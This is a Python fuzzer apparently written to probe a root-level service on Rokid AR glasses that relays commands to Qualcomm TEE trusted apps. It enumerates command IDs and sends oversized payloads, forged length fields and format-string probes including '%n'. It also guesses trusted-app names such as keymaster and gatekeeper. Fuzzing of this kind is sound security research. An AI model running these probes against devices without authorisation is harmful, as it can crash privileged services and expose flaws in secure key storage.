#!/usr/bin/env python3
"""
GateServiced Fuzzer - Rokid AR Glasses
Target: Root service listening on 0.0.0.0:8341
Error Code Analysis: 0x300c = "TA (Trusted App) not loaded"

This indicates QSEE/TEE interaction. The service likely:
1. Receives commands from userspace
2. Forwards to Trusted App via /dev/qseecom or similar
3. Returns TA responses

Protocol (observed): [4 bytes: cmd_id] [4 bytes: total_len] [payload]
"""

import socket
import struct
import time
import sys
import random
from typing import Optional, Tuple, List

HOST = "127.0.0.1"  # localhost for device-side execution
PORT = 8341

# Known error codes (QSEE-style)
ERROR_CODES = {
    0x0000: "SUCCESS",
    0x3001: "GENERAL_ERROR",
    0x3002: "INVALID_PARAMETER",
    0x3003: "NOT_SUPPORTED",
    0x3004: "OUT_OF_MEMORY",
    0x3005: "BUSY",
    0x3006: "ACCESS_DENIED",
    0x3007: "TIMEOUT",
    0x300c: "TA_NOT_LOADED",
    0x300d: "TA_DEAD",
    0x300e: "SESSION_NOT_FOUND",
    0x300f: "CMD_NOT_SUPPORTED",
}

class GateServiceFuzzer:
    def __init__(self, host: str, port: int, timeout: float = 5.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.results = []
        
    def connect(self) -> Optional[socket.socket]:
        """Establish connection to GateServiced"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            return sock
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return None
    
    def send_command(self, cmd_id: int, payload: bytes) -> Tuple[bytes, str]:
        """Send command and receive response"""
        sock = self.connect()
        if not sock:
            return b"", "CONNECTION_FAILED"
        
        try:
            # Protocol: [cmd_id:4][total_len:4][payload]
            total_len = 8 + len(payload)  # header + payload
            header = struct.pack("<II", cmd_id, total_len)
            packet = header + payload
            
            sock.sendall(packet)
            
            # Receive response
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) >= 8:  # At least got header
                        # Check if we have complete response
                        resp_len = struct.unpack("<I", response[4:8])[0]
                        if len(response) >= resp_len:
                            break
            except socket.timeout:
                pass
            
            # Parse response
            status = "UNKNOWN"
            if len(response) >= 4:
                error_code = struct.unpack("<I", response[:4])[0]
                status = ERROR_CODES.get(error_code, f"ERROR_0x{error_code:04x}")
            
            return response, status
            
        except Exception as e:
            return b"", f"EXCEPTION: {e}"
        finally:
            sock.close()
    
    def fuzz_cmd_ids(self):
        """Fuzz different command IDs to discover valid commands"""
        print("\n" + "="*60)
        print("[*] Phase 1: Command ID Enumeration")
        print("="*60)
        
        interesting = []
        
        # Test common command ID patterns
        test_cmds = list(range(0, 256))  # Basic range
        test_cmds.extend([0x1000, 0x2000, 0x3000, 0x4000, 0x5000])
        test_cmds.extend([0x10000, 0x20000, 0x100000])
        test_cmds.extend([0x47415445])  # "GATE" in ASCII
        test_cmds.extend([0xDEADBEEF, 0xCAFEBABE])
        
        for cmd_id in test_cmds:
            response, status = self.send_command(cmd_id, b"")
            
            # Log anything that isn't TA_NOT_LOADED
            if status != "TA_NOT_LOADED" or len(response) > 8:
                print(f"  cmd=0x{cmd_id:08x} -> {status} (resp_len={len(response)})")
                interesting.append((cmd_id, status, response))
            elif cmd_id % 50 == 0:
                print(f"  cmd=0x{cmd_id:08x} -> {status}")
        
        return interesting
    
    def fuzz_payload_lengths(self):
        """Fuzz payload lengths for buffer overflow detection"""
        print("\n" + "="*60)
        print("[*] Phase 2: Payload Length Fuzzing")
        print("="*60)
        
        # Test various payload sizes
        sizes = [
            0, 1, 4, 7, 8, 15, 16, 31, 32, 63, 64,
            127, 128, 255, 256, 511, 512, 1023, 1024,
            2048, 4096, 8192, 16384, 32768, 65536,
            0x10000, 0x20000, 0x100000,  # Large sizes
        ]
        
        for size in sizes:
            # Fill with pattern for crash detection
            if size > 0:
                # Use "AAAA..." pattern for easy crash identification
                payload = b"A" * size
            else:
                payload = b""
            
            try:
                response, status = self.send_command(0, payload)
                print(f"  size={size:6d} (0x{size:06x}) -> {status}")
                
                # Check for crash indicators
                if "EXCEPTION" in status or status == "CONNECTION_FAILED":
                    print(f"    [!] Potential crash at size {size}")
                    self.results.append(("CRASH_SIZE", size))
                    
            except Exception as e:
                print(f"  size={size} -> EXCEPTION: {e}")
                
            # Small delay to avoid overwhelming
            time.sleep(0.1)
    
    def fuzz_total_len_mismatch(self):
        """Fuzz total_len field to trigger integer overflow/underflow"""
        print("\n" + "="*60)
        print("[*] Phase 3: total_len Integer Overflow/Mismatch")
        print("="*60)
        
        actual_payload = b"X" * 64
        
        # Test mismatched lengths
        test_lens = [
            0,                  # Zero length
            4,                  # Less than header
            8,                  # Header only
            len(actual_payload),  # Payload only, no header
            8 + len(actual_payload),  # Correct
            8 + len(actual_payload) - 1,  # Off by one (undercount)
            8 + len(actual_payload) + 1,  # Off by one (overcount)
            8 + len(actual_payload) * 2,  # Double size
            0xFFFFFFFF,         # Max u32
            0xFFFFFFFE,         # Max u32 - 1
            0x80000000,         # Sign bit
            0x7FFFFFFF,         # Max signed
            1,                  # Tiny
        ]
        
        for fake_len in test_lens:
            sock = self.connect()
            if not sock:
                continue
            
            try:
                cmd_id = 0
                header = struct.pack("<II", cmd_id, fake_len)
                packet = header + actual_payload
                
                sock.sendall(packet)
                
                response = b""
                try:
                    sock.settimeout(2.0)
                    response = sock.recv(4096)
                except socket.timeout:
                    pass
                
                status = "NO_RESPONSE"
                if len(response) >= 4:
                    err = struct.unpack("<I", response[:4])[0]
                    status = ERROR_CODES.get(err, f"0x{err:08x}")
                
                print(f"  fake_len=0x{fake_len:08x} actual={len(packet)} -> {status}")
                
            except Exception as e:
                print(f"  fake_len=0x{fake_len:08x} -> EXCEPTION: {e}")
            finally:
                sock.close()
            
            time.sleep(0.1)
    
    def fuzz_qsee_commands(self):
        """Fuzz common QSEE/TEE command structures"""
        print("\n" + "="*60)
        print("[*] Phase 4: QSEE-style Command Structures")
        print("="*60)
        
        # QSEE command structure often includes:
        # - TA name/UUID (32-40 bytes)
        # - Command ID
        # - Request buffer pointer (will be ignored in our context)
        # - Response buffer pointer
        # - Sizes
        
        # Common TA names on Qualcomm devices
        ta_names = [
            b"fingerprint",
            b"keymaster",
            b"gatekeeper",
            b"widevine",
            b"hdcp",
            b"sec_ui",
            b"rokid",
            b"camera",
            b"secure_touch",
            b"playready",
        ]
        
        for ta_name in ta_names:
            # Pad to 32 bytes
            padded_name = ta_name.ljust(32, b'\x00')
            
            # Try different sub-command IDs
            for sub_cmd in range(0, 16):
                payload = padded_name + struct.pack("<I", sub_cmd)
                
                response, status = self.send_command(0, payload)
                
                if status != "TA_NOT_LOADED":
                    print(f"  TA={ta_name.decode()} cmd={sub_cmd} -> {status}")
                    self.results.append(("TA_CMD", ta_name, sub_cmd, status))
    
    def fuzz_format_strings(self):
        """Test for format string vulnerabilities"""
        print("\n" + "="*60)
        print("[*] Phase 5: Format String Probes")
        print("="*60)
        
        payloads = [
            b"%s" * 10,
            b"%x" * 20,
            b"%n" * 5,
            b"%p" * 20,
            b"AAAA%p%p%p%p%p%p%p%p%p%p",
            b"%08x." * 50,
            b"\x00\x00\x00\x00%n",
        ]
        
        for payload in payloads:
            response, status = self.send_command(0, payload)
            
            # Check if response contains leaked memory
            if len(response) > 8:
                # Look for pointer patterns
                hex_data = response[8:].hex()
                if any(x in hex_data for x in ['ffffff', '7f7f7f', 'deadbeef']):
                    print(f"  Payload: {payload[:20]}... -> Possible leak!")
                    print(f"    Response: {response.hex()}")
                    self.results.append(("FMT_LEAK", payload, response))
            
            time.sleep(0.1)
    
    def run_all(self):
        """Run all fuzzing phases"""
        print("="*60)
        print("GateServiced Fuzzer - Rokid AR Glasses")
        print(f"Target: {self.host}:{self.port}")
        print("="*60)
        
        # Verify connectivity first
        sock = self.connect()
        if not sock:
            print("[!] Cannot connect to GateServiced")
            return
        sock.close()
        print("[+] Connection successful")
        
        # Run fuzzing phases
        self.fuzz_cmd_ids()
        self.fuzz_payload_lengths()
        self.fuzz_total_len_mismatch()
        self.fuzz_qsee_commands()
        self.fuzz_format_strings()
        
        # Summary
        print("\n" + "="*60)
        print("[*] SUMMARY")
        print("="*60)
        if self.results:
            for r in self.results:
                print(f"  {r}")
        else:
            print("  No interesting findings")


def probe_protocol():
    """Initial protocol probe to understand message format"""
    print("="*60)
    print("[*] Protocol Probe")
    print("="*60)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    
    try:
        sock.connect((HOST, PORT))
        print(f"[+] Connected to {HOST}:{PORT}")
        
        # Test 1: Empty packet
        sock.sendall(b"")
        time.sleep(0.5)
        
        # Test 2: Minimal header
        sock.sendall(struct.pack("<II", 0, 8))
        try:
            resp = sock.recv(4096)
            print(f"[+] Response to minimal header: {resp.hex()}")
        except socket.timeout:
            print("[!] No response (timeout)")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        sock.close()


def single_test(cmd_id: int, payload: bytes):
    """Single command test for manual exploration"""
    print(f"[*] Testing cmd=0x{cmd_id:08x} payload_len={len(payload)}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    
    try:
        sock.connect((HOST, PORT))
        
        total_len = 8 + len(payload)
        header = struct.pack("<II", cmd_id, total_len)
        packet = header + payload
        
        print(f"[*] Sending: {packet[:64].hex()}...")
        sock.sendall(packet)
        
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        print(f"[*] Response ({len(response)} bytes): {response.hex()}")
        
        if len(response) >= 4:
            err = struct.unpack("<I", response[:4])[0]
            print(f"[*] Error code: 0x{err:08x} = {ERROR_CODES.get(err, 'UNKNOWN')}")
            
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        sock.close()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "probe":
            probe_protocol()
        elif sys.argv[1] == "test" and len(sys.argv) >= 3:
            cmd_id = int(sys.argv[2], 0)
            payload = sys.argv[3].encode() if len(sys.argv) > 3 else b""
            single_test(cmd_id, payload)
        elif sys.argv[1] == "fuzz":
            fuzzer = GateServiceFuzzer(HOST, PORT)
            fuzzer.run_all()
        else:
            print("Usage: python3 gateservice_fuzzer.py [probe|test <cmd_id> [payload]|fuzz]")
    else:
        # Default: run all fuzzing
        fuzzer = GateServiceFuzzer(HOST, PORT)
        fuzzer.run_all()
